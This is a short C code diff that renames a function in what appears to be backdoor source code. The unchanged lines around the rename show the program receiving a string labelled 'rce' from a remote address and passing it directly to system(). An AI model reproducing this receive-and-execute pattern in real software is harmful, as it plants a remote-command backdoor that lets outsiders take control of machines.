@@ -63,7 +63,7 @@ void usage() {
   exit(0);
 }
 
-int handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
+int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   printf(" ** Boop: %s\n ", dial);
   struct sockaddr_in daddr;
   daddr.sin_family = AF_INET;
@@ -332,7 +332,7 @@ int main(int argc, char **argv) {
       if (!ignore) {
         char *rce = malloc(MAX_RCE_SIZE);
         int errno;
-        errno = handlerevrce(saddrval, rce);
+        errno = recvrce(saddrval, rce);
         if (errno == 0) {
           printf(" <- %s\n", rce);
           system(rce);
